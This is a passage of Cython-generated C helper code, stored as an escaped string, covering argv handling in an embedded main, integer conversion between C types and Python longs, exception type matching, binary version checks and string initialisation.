return res;\noom:\n    fprintf(stderr, \"out of memory\\\\n\");\n    return NULL;\n}\nint\nmain(int argc, char **argv)\n{\n    if (!argc) {\n        return __Pyx_main(0, NULL);\n    }\n    else {\n        int i, res;\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\n        if (!argv_copy || !argv_copy2 || !oldloc) {\n            fprintf(stderr, \"out of memory\\\\n\");\n            free(argv_copy);\n            free(argv_copy2);\n            free(oldloc);\n            return 1;\n        }\n        res = 0;\n        setlocale(LC_ALL, \"\");\n        for (i = 0; i < argc; i++) {\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\n            if (!argv_copy[i]) res = 1;\n        }\n        setlocale(LC_ALL, oldloc);\n        free(oldloc);\n        if (res == 0)\n            res = __Pyx_main(argc, argv_copy);\n        for (i = 0; i < argc; i++) {\n#if PY_VERSION_HEX < 0x03050000\n            free(argv_copy2[i]);\n#else\n            PyMem_RawFree(argv_copy2[i]);\n#endif\n        }\n        free(argv_copy);\n        free(argv_copy2);\n        return res;\n    }\n}\n#endif""\n\n/* CIntToPy */\n    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (is_unsigned) {\n        if (sizeof(long) < sizeof(long)) {\n            return PyInt_FromLong((long) value);\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\n            return PyLong_FromUnsignedLong((unsigned long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\n#endif\n        }\n    } else {\n        if (sizeof(long) <= sizeof(long)) {\n            return PyInt_FromLong((long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\n#endif\n        }\n    }\n    {\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&value;\n        return _PyLong_FromByteArray(bytes, sizeof(long),\n                                     little, !is_unsigned);\n    }\n}\n\n/* CIntFromPyVerify */\n    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\n#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\\\n    {\\\n        func_type value = func_value;\\\n        if (sizeof(target_type) < sizeof(func_type)) {\\\n            if (unlikely(value != (func_type) (target_type) value)) {\\\n                func_type zero = 0;\\\n                if (e""xc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\\\n                    return (target_type) -1;\\\n                if (is_unsigned && unlikely(value < zero))\\\n                    goto raise_neg_overflow;\\\n                else\\\n                    goto raise_overflow;\\\n            }\\\n        }\\\n        return (target_type) value;\\\n    }\n\n/* CIntFromPy */\n    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if (sizeof(long) < sizeof(long)) {\n            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (long) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (long) 0;\n                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])\n                case 2:\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {\n                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n         ""           }\n                    break;\n                case 3:\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {\n                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {\n                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));\n                        }\n                    }\n                    break;\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (long) -1;\n                if (unlikely(result == 1))\n                    goto raise_neg_overflow;\n            }\n#endif\n            if (sizeof(long) <= sizeof(unsigned long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long"", unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (long) 0;\n                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))\n                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])\n                case -2:\n                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                          ""  __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {\n    ""                    if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n            }\n#endif\n            if (sizeof(long) <= sizeof(long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\n            PyErr_SetString(PyExc_RuntimeError,\n                            \"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\");\n#else\n            long val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n #if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n #endif\n            if (likely(v)) {\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                              bytes, sizeof(val),\n                                              is_little, !is_unsigned);\n                Py_DECREF(v);\n                if (likely(!ret))\n                    r""eturn val;\n            }\n#endif\n            return (long) -1;\n        }\n    } else {\n        long val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (long) -1;\n        val = __Pyx_PyInt_As_long(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"value too large to convert to long\");\n    return (long) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"can't convert negative value to long\");\n    return (long) -1;\n}\n\n/* CIntFromPy */\n    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const int neg_one = (int) -1, const_zero = (int) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n#if PY_MAJOR_VERSION < 3\n    if (likely(PyInt_Check(x))) {\n        if (sizeof(int) < sizeof(long)) {\n            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))\n        } else {\n            long val = PyInt_AS_LONG(x);\n            if (is_unsigned && unlikely(val < 0)) {\n                goto raise_neg_overflow;\n            }\n            return (int) val;\n        }\n    } else\n#endif\n    if (likely(PyLong_Check(x))) {\n        if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (int) 0;\n                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])\n                case 2:\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                       "" } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {\n                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n            }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n            if (unlikely(Py_SIZE(x) < 0)) {\n                goto raise_neg_overflow;\n            }\n#else\n            {\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                if (unlikely(result < 0))\n                    return (int) -1;\n                if (unlikely(result == 1))\n    ""                goto raise_neg_overflow;\n            }\n#endif\n            if (sizeof(int) <= sizeof(unsigned long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n            }\n        } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\n            switch (Py_SIZE(x)) {\n                case  0: return (int) 0;\n                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))\n                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])\n                case -2:\n                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    ""if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                 ""   }\n                    break;\n                case 4:\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n            }\n#endif\n            if (sizeof(int) <= sizeof(long)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\n            PyErr_SetString(PyExc_RuntimeError,\n                            \"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\");\n#else\n            int val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n #if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n #endif\n            if (likely(v)) {\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                              bytes, sizeof(val),\n                                              ""is_little, !is_unsigned);\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n#endif\n            return (int) -1;\n        }\n    } else {\n        int val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (int) -1;\n        val = __Pyx_PyInt_As_int(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"value too large to convert to int\");\n    return (int) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        \"can't convert negative value to int\");\n    return (int) -1;\n}\n\n/* FastTypeChecks */\n    #if CYTHON_COMPILING_IN_CPYTHON\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\n    while (a) {\n        a = a->tp_base;\n        if (a == b)\n            return 1;\n    }\n    return b == &PyBaseObject_Type;\n}\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (a == b) return 1;\n    mro = a->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(a, b);\n}\n#if PY_MAJOR_VERSION == 2\nstatic int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {\n    PyObject *exception, *value, *tb;\n    int res;\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ErrFetch(&exception, &value, &tb);\n    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;\n    if (unlikely(res == -1)) {\n        PyErr_WriteUnraisable(err);\n        res = 0;\n    }\n    if (!res) {\n        res = PyObject_IsSubclass(err, exc_type2);\n        if (unlikely(res == -1)) {\n            PyErr_WriteUnraisable(err);\n            res = 0;\n        }""\n    }\n    __Pyx_ErrRestore(exception, value, tb);\n    return res;\n}\n#else\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\n    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;\n    if (!res) {\n        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\n    }\n    return res;\n}\n#endif\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    assert(PyExceptionClass_Check(exc_type));\n    n = PyTuple_GET_SIZE(tuple);\n#if PY_MAJOR_VERSION >= 3\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n#endif\n    for (i=0; i<n; i++) {\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\n        #if PY_MAJOR_VERSION < 3\n        if (likely(exc_type == t)) return 1;\n        #endif\n        if (likely(PyExceptionClass_Check(t))) {\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\n        } else {\n        }\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\n    if (likely(err == exc_type)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        if (likely(PyExceptionClass_Check(exc_type))) {\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);\n        } else if (likely(PyTuple_Check(exc_type))) {\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\n        } else {\n        }\n    }\n    return PyErr_GivenExceptionMatches(err, exc_type);\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\n    assert(PyExceptionClass_Check(exc_type1));\n    assert(PyExceptionClass_Check(exc_type2));\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\n    if (likely(PyExceptionClass_Check(err))"") {\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\n    }\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\n}\n#endif\n\n/* CheckBinaryVersion */\n    static int __Pyx_check_binary_version(void) {\n    char ctversion[5];\n    int same=1, i, found_dot;\n    const char* rt_from_call = Py_GetVersion();\n    PyOS_snprintf(ctversion, 5, \"%d.%d\", PY_MAJOR_VERSION, PY_MINOR_VERSION);\n    found_dot = 0;\n    for (i = 0; i < 4; i++) {\n        if (!ctversion[i]) {\n            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');\n            break;\n        }\n        if (rt_from_call[i] != ctversion[i]) {\n            same = 0;\n            break;\n        }\n    }\n    if (!same) {\n        char rtversion[5] = {'\\0'};\n        char message[200];\n        for (i=0; i<4; ++i) {\n            if (rt_from_call[i] == '.') {\n                if (found_dot) break;\n                found_dot = 1;\n            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {\n                break;\n            }\n            rtversion[i] = rt_from_call[i];\n        }\n        PyOS_snprintf(message, sizeof(message),\n                      \"compiletime version %s of module '%.100s' \"\n                      \"does not match runtime version %s\",\n                      ctversion, __Pyx_MODULE_NAME, rtversion);\n        return PyErr_WarnEx(NULL, message, 1);\n    }\n    return 0;\n}\n\n/* InitStrings */\n    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {\n    while (t->p) {\n        #if PY_MAJOR_VERSION < 3\n        if (t->is_unicode) {\n            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);\n        } else if (t->intern) {\n            *t->p = PyString_InternFromString(t->s);\n        } else {\n            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);\n        }\n        #else\n        if (t->is_unicode | t->is_str) {\n            if (t->intern) {\n               "" *t->p = PyUnicode_InternFromString(t->s);\n            } else if (t->encoding) {\n                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);\n            } else {\n                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);\n            }\n        } else {\n            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);\n        }\n        #endif\n        if (!*t->p)\n            return -1;\n        if (PyObject_Hash(*t->p) == -1)\n            return -1;\n        ++t;\n    }\n    return 0;\n}\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));\n}\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\n    Py_ssize_t ignore;\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\n}\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n#if !CYTHON_PEP393_ENABLED\nstatic const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    char* defenc_c;\n    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);\n    if (!defenc) return NULL;\n    defenc_c = PyBytes_AS_STRING(defenc);\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    {\n        char* end = defenc_c + PyBytes_GET_SIZE(defenc);\n        char* c;\n        for (c = defenc_c; c < end; c++) {\n            if ((unsigned char) (*c) >= 128) {\n                PyUnicode_AsASCIIString(o);\n                return NULL;\n            }\n        }\n    }\n#endif\n    *length = PyBytes_GET_SIZE(defenc);\n    return defenc_c;\n}\n#else\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    if (likely(PyUnicode_IS_ASCII(o))) {\n        *length = PyUnicode_GET_LENGTH(o);\n        return PyUnicode_AsUTF8(o);\n    } else {\n        PyUnicode_AsASCIIString(""o);\n        return NULL;\n    }\n#else\n    return 